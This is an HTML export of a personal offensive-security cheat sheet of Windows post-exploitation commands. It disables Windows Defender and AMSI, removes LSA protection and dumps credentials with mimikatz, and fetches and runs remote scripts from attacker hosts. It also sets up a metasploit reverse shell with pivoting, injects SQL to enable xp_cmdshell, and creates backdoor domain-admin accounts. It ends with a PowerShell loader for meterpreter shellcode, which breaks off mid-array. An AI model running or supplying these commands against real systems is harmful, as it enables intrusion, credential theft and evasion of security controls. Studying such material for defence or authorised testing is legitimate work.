<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>18- Usefull commands</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>18- Usefull commands</h1><br/><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># as admin disable defender monitoring</span><br />REG ADD <span style="color:#3ad900;font-weight:400">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v <span style="color:#3ad900;font-weight:400">&quot;DisableRealtimeMonitoring &quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">/</span>f<br />REG ADD <span style="color:#3ad900;font-weight:400">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v <span style="color:#3ad900;font-weight:400">&quot;DisableBehaviorMonitoring &quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">/</span>f<br /><br /><span style="color:#0088ff;font-weight:400"># Enable restricted admin mode (hich allows system administrators to perform a network login with RDP)</span><br /><span style="color:#ff9d00;font-weight:700">New-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> <span style="color:#333333;font-weight:400">-Name</span> DisableRestrictedAdmin <span style="color:#333333;font-weight:400">-Value</span> <span style="color:#333333;font-weight:400">0</span> <br /><br /><span style="color:#0088ff;font-weight:400"># mimikatz remove lsa protection</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Administrator<span style="color:#ff9d00;font-weight:700">\</span>Documents<span style="color:#ff9d00;font-weight:700">\</span>mini.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!+&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!processprotect /process:lsass.exe /remove&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::logonpasswords&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># pivoting through proxychains and metasploit</span><br /><span style="color:#0088ff;font-weight:400">## https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0</span><br />    sudo msfconsole <span style="color:#ff9d00;font-weight:700">-</span>x <span style="color:#333333;font-weight:400">&#39;use auxiliary/server/socks4a; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set AutoRunScript &quot;autoroute -s 172.16.X.0/24&quot;; run&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400"># load file to  memory </span><br /><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/amsi.txt&#39;</span>)<br /><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/PowerView.ps1&#39;</span>)<br /><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/mimikatz.txt&#39;</span>)<br />iwr <span style="color:#ff9d00;font-weight:700">-</span>uri http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">45.228</span><span style="color:#ff9d00;font-weight:700">/</span>mimikatz.exe <span style="color:#ff9d00;font-weight:700">-</span>Outfile mimikatz.exe <br /><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <br />privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />token<span style="color:#ff9d00;font-weight:700">::</span>elevate <br />lsadump<span style="color:#ff9d00;font-weight:700">::</span>secrets<br />sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>logonpasswords<br /><br />PowerUpSQL.ps1<br /><span style="color:#0088ff;font-weight:400"># remove cached tickets</span><br />klist purge<br /><br /><span style="color:#0088ff;font-weight:400">## powershell shellcode runner</span><br />pwsh <br /><span style="color:#0088ff;font-weight:400">$text</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.14.4/apple.exe&#39;) | IEX&quot;</span><br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$text</span>) <br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$text</span>) <br /><span style="color:#0088ff;font-weight:400">$EncodedText</span> <span style="color:#ff9d00;font-weight:700">=</span> [Convert]<span style="color:#ff9d00;font-weight:700">::</span>ToBase64String(<span style="color:#0088ff;font-weight:400">$bytes</span>)<br /><span style="color:#0088ff;font-weight:400">$EncodedText</span><br /><br /><br /><br /><span style="color:#0088ff;font-weight:400">$a</span><span style="color:#ff9d00;font-weight:700">=</span>[Ref].Assembly.GetTypes();<span style="color:#ff9d00;font-weight:700">Foreach</span>(<span style="color:#0088ff;font-weight:400">$b</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$a</span>) {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$b</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;*iUtils&quot;</span>){<span style="color:#0088ff;font-weight:400">$c</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$b</span>}};<span style="color:#0088ff;font-weight:400">$d</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$c</span>.GetFields(<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>);<span style="color:#ff9d00;font-weight:700">Foreach</span>(<span style="color:#0088ff;font-weight:400">$e</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$d</span>) {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$e</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;*Context&quot;</span>) {<span style="color:#0088ff;font-weight:400">$f</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$e</span>}};<span style="color:#0088ff;font-weight:400">$g</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$f</span>.GetValue(<span style="color:#0088ff;font-weight:400">$null</span>);[IntPtr]<span style="color:#0088ff;font-weight:400">$ptr</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$g</span>;[<span style="color:#7f0044;font-weight:400">Int32</span>[]]<span style="color:#0088ff;font-weight:400">$buf</span> <span style="color:#ff9d00;font-weight:700">=</span> @(<span style="color:#333333;font-weight:400">0</span>);[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$buf</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$ptr</span>, <span style="color:#333333;font-weight:400">1</span>)<br /><br /><br /><span style="color:#0088ff;font-weight:400">## change adminustrator user </span><br />net user administrator passw0rd<span style="color:#ff9d00;font-weight:700">!</span> <br /><span style="color:#0088ff;font-weight:400">### if not already add him to rdp group</span><br /><span style="color:#00117f;font-weight:400">Add-LocalGroupMember</span> <span style="color:#ff9d00;font-weight:700">-Group</span> <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop Users&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>Member <span style="color:#3ad900;font-weight:400">&quot;username&quot;</span><br /><br />net user rulon Password123<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#ff9d00;font-weight:700">/</span>add <span style="color:#ff9d00;font-weight:700">/</span>domain<br />net localgroup <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop Users&quot;</span> rulon <span style="color:#ff9d00;font-weight:700">/</span>add <span style="color:#ff9d00;font-weight:700">/</span>domain<br />net <span style="color:#ff9d00;font-weight:700">group</span> <span style="color:#3ad900;font-weight:400">&quot;domain admins&quot;</span> rulon <span style="color:#ff9d00;font-weight:700">/</span>add <span style="color:#ff9d00;font-weight:700">/</span>domain<br /><br /><br /><span style="color:#0088ff;font-weight:400">## sql injection execute shell injection </span><br /><span style="color:#333333;font-weight:400">&#39;;EXECUTE AS LOGIN = &#39;</span>sa<span style="color:#333333;font-weight:400">&#39;;EXEC sp_configure&#39;</span>show advanced options<span style="color:#333333;font-weight:400">&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;</span>xp_cmdshell<span style="color:#333333;font-weight:400">&#39;, 1; RECONFIGURE;EXEC xp_cmdshell &#39;</span>powershell.exe <span style="color:#ff9d00;font-weight:700">-</span>exec bypass <span style="color:#ff9d00;font-weight:700">-</span>enc JABkAGEAdABhACAAPQAgACgATgBlAxxxxxxxxxxxxxxxxxxxxxxxxx<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">&#39;--&#39;</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## anble rdp </span><br />reg add <span style="color:#3ad900;font-weight:400">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v fDenyTSConnections <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">/</span>f<br />netsh advfirewall firewall <span style="color:#ff9d00;font-weight:700">set</span> rule <span style="color:#ff9d00;font-weight:700">group=</span><span style="color:#3ad900;font-weight:400">&quot;remote desktop&quot;</span> new enable<span style="color:#ff9d00;font-weight:700">=</span>yes</pre></div></p><p></p><p><h2>Disable LSA</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Load</span><br /><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/amsi.txt&#39;</span>)<br />(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/Invoke-Mimikatz.ps1&#39;</span>) | <span style="color:#ff9d00;font-weight:700">IEX</span><br />(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;http://192.168.45.228/mimidrv.sys&quot;</span>,<span style="color:#333333;font-weight:400">&#39;C:\inetpub\wwwroot\upload\mimidrv.sys&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Execute</span><br />cmd <span style="color:#ff9d00;font-weight:700">/</span>c <span style="color:#3ad900;font-weight:400">&quot;sc query mimidrv || (sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand &amp;&amp; sc start mimidrv)&quot;</span><br /><span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#3ad900;font-weight:400">&quot;`&quot;</span><span style="color:#ff9d00;font-weight:700">!</span>processprotect <span style="color:#ff9d00;font-weight:700">/process:</span>lsass.exe <span style="color:#ff9d00;font-weight:700">/</span>remove<span style="color:#ff9d00;font-weight:700">`</span><span style="color:#3ad900;font-weight:400">&quot;&quot;</span></pre></div></p><p></p><p></p><p><h2>Disable defender</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Remove Windows Defender definitions kill AV </span><br />&amp; <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>RemoveDefinitions <span style="color:#ff9d00;font-weight:700">-</span>All<br /><br /><span style="color:#ff9d00;font-weight:700">Set-</span>MpPreference <span style="color:#ff9d00;font-weight:700">-</span>DisableRealtimeMonitoring <span style="color:#0088ff;font-weight:400">$true</span><br /><span style="color:#0088ff;font-weight:400"># Disable Windows Defender real-time monitoring</span><br /><span style="color:#ff9d00;font-weight:700">Set-</span>MpPreference <span style="color:#ff9d00;font-weight:700">-</span>DisableRealtimeMonitoring <span style="color:#0088ff;font-weight:400">$true</span><br /><br /><span style="color:#0088ff;font-weight:400">## alternative method : exclusive list</span><br /><span style="color:#00117f;font-weight:400">Add-MpPreference</span> <span style="color:#ff9d00;font-weight:700">-</span>ExclusionPath c<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>tasks<br /><span style="color:#0088ff;font-weight:400">### this command  instructs Windows Defender to disable both its scheduled and real-time scanning for files located in this folder.</span></pre></div></p><p></p><p><h2>Create admin</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Create new administrator</span><br />net user tristram Fall2023<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#ff9d00;font-weight:700">/</span>add<br />net localgroup administrators tristram <span style="color:#ff9d00;font-weight:700">/</span>add<br /><br /><span style="color:#0088ff;font-weight:400"># Enable RDP if it&#39;s currently disabled</span><br /><span style="color:#0088ff;font-weight:400">$RDP</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;fDenyTSConnections&quot;</span><br /><span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$RDP</span>.fDenyTSConnections <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#333333;font-weight:400">1</span>) {<br />    <span style="color:#ff9d00;font-weight:700">Write-Output</span> <span style="color:#3ad900;font-weight:400">&quot;Enabling Remote Desktop...&quot;</span><br />    <span style="color:#ff9d00;font-weight:700">Set-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;fDenyTSConnections&quot;</span> <span style="color:#333333;font-weight:400">-Value</span> <span style="color:#333333;font-weight:400">0</span><br />    netsh advfirewall firewall <span style="color:#ff9d00;font-weight:700">set</span> rule <span style="color:#ff9d00;font-weight:700">group=</span><span style="color:#333333;font-weight:400">&#39;remote desktop&#39;</span> new enable<span style="color:#ff9d00;font-weight:700">=</span>Yes<br />    <span style="color:#ff9d00;font-weight:700">Write-Output</span> <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop is now enabled.&quot;</span><br />} <span style="color:#ff9d00;font-weight:700">else</span> {<br />    <span style="color:#ff9d00;font-weight:700">Write-Output</span> <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop is already enabled.&quot;</span><br />}</pre></div></p><p></p><p></p><p><h2>Nmap</h2></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> nmap -A -Pn 192.168.X.Y-Z -vvv</pre></div></p><p></p><p></p><p></p><p><h2>Powershell shellcode runner</h2></p><p><a href="https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners">https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners</a></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Compact AMSI bypass</span><br />[Ref].Assembly.GetType(<span style="color:#333333;font-weight:400">&#39;System.Management.Automation.Amsi&#39;</span><span style="color:#ff9d00;font-weight:700">+</span>[<span style="color:#7f0044;font-weight:400">char</span>]<span style="color:#333333;font-weight:400">85</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;tils&#39;</span>).GetField(<span style="color:#333333;font-weight:400">&#39;ams&#39;</span><span style="color:#ff9d00;font-weight:700">+</span>[<span style="color:#7f0044;font-weight:400">char</span>]<span style="color:#333333;font-weight:400">105</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;InitFailed&#39;</span>,<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>).SetValue(<span style="color:#0088ff;font-weight:400">$null</span>,<span style="color:#0088ff;font-weight:400">$true</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Shellcode loader &gt;:]</span><br /><span style="color:#ff9d00;font-weight:700">function</span> LookupFunc {<br />    <span style="color:#ff9d00;font-weight:700">Param</span> (<span style="color:#0088ff;font-weight:400">$moduleName</span>, <span style="color:#0088ff;font-weight:400">$functionName</span>)<br />    <span style="color:#0088ff;font-weight:400">$assem</span> <span style="color:#ff9d00;font-weight:700">=</span> ([AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.GetAssemblies() |<br />    <span style="color:#ff9d00;font-weight:700">Where-Object</span> { <span style="color:#0088ff;font-weight:400">$_</span>.GlobalAssemblyCache <span style="color:#ff9d00;font-weight:700">-And</span> <span style="color:#0088ff;font-weight:400">$_</span>.Location.Split(<span style="color:#333333;font-weight:400">&#39;\\&#39;</span>)[<span style="color:#ff9d00;font-weight:700">-</span><span style="color:#333333;font-weight:400">1</span>].<br />    Equals(<span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span>) }).GetType(<span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)<br />    <span style="color:#0088ff;font-weight:400">$tmp</span><span style="color:#ff9d00;font-weight:700">=</span>@()<br />    <span style="color:#0088ff;font-weight:400">$assem</span>.GetMethods() | <span style="color:#ff9d00;font-weight:700">ForEach-Object</span> {<span style="color:#ff9d00;font-weight:700">If</span>(<span style="color:#0088ff;font-weight:400">$_</span>.Name <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#3ad900;font-weight:400">&quot;GetProcAddress&quot;</span>) {<span style="color:#0088ff;font-weight:400">$tmp</span><span style="color:#ff9d00;font-weight:700">+=</span><span style="color:#0088ff;font-weight:400">$_</span>}}<br />    <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:400">$tmp</span>[<span style="color:#333333;font-weight:400">0</span>].Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @((<span style="color:#0088ff;font-weight:400">$assem</span>.GetMethod(<span style="color:#333333;font-weight:400">&#39;GetModuleHandle&#39;</span>)).Invoke(<span style="color:#0088ff;font-weight:400">$null</span>,<br />    @(<span style="color:#0088ff;font-weight:400">$moduleName</span>)), <span style="color:#0088ff;font-weight:400">$functionName</span>))<br />}<br /><br /><span style="color:#ff9d00;font-weight:700">function</span> getDelegateType {<br />    <span style="color:#ff9d00;font-weight:700">Param</span> (<br />    [<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>, <span style="color:#ff9d00;font-weight:400">Mandatory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$True</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>[]] <span style="color:#0088ff;font-weight:400">$func</span>,<br />    [<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">1</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>] <span style="color:#0088ff;font-weight:400">$delType</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">Void</span>]<br />    )<br />    <span style="color:#0088ff;font-weight:400">$type</span> <span style="color:#ff9d00;font-weight:700">=</span> [AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.<br />    DefineDynamicAssembly((<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Reflection.AssemblyName(<span style="color:#333333;font-weight:400">&#39;ReflectedDelegate&#39;</span>)),<br />    [System.Reflection.Emit.AssemblyBuilderAccess]<span style="color:#ff9d00;font-weight:700">::</span>Run).<br />    DefineDynamicModule(<span style="color:#333333;font-weight:400">&#39;InMemoryModule&#39;</span>, <span style="color:#0088ff;font-weight:400">$false</span>).<br />    DefineType(<span style="color:#333333;font-weight:400">&#39;MyDelegateType&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span>,<br />    [System.MulticastDelegate])<br />    <span style="color:#0088ff;font-weight:400">$type</span>.<br />    DefineConstructor(<span style="color:#333333;font-weight:400">&#39;RTSpecialName, HideBySig, Public&#39;</span>,<br />    [System.Reflection.CallingConventions]<span style="color:#ff9d00;font-weight:700">::</span>Standard, <span style="color:#0088ff;font-weight:400">$func</span>).<br />    SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br />    <span style="color:#0088ff;font-weight:400">$type</span>.<br />    DefineMethod(<span style="color:#333333;font-weight:400">&#39;Invoke&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span>, <span style="color:#0088ff;font-weight:400">$delType</span>, <span style="color:#0088ff;font-weight:400">$func</span>).<br />    SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br />    <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:400">$type</span>.CreateType()<br />}<br /><br /><span style="color:#0088ff;font-weight:400"># Allocate executable memory</span><br /><span style="color:#0088ff;font-weight:400">$lpMem</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), <br />  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero, <span style="color:#333333;font-weight:400">0x1000</span>, <span style="color:#333333;font-weight:400">0x3000</span>, <span style="color:#333333;font-weight:400">0x40</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Copy shellcode to allocated memory</span><br /><span style="color:#0088ff;font-weight:400"># sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f powershell</span><br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]] <span style="color:#0088ff;font-weight:400">$buf</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0xfc</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x83</span>,<span style="color:#333333;font-weight:400">0xe4</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0xcc</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xd2</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x65</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x60</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x4d</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0xb7</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x7c</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x2c</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0xed</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x42</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x81</span>,<span style="color:#333333;font-weight:400">0x78</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0xb</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x80</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x67</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0xe3</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xc9</span>,<span style="color:#333333;font-weight:400">0x41</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x88</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span 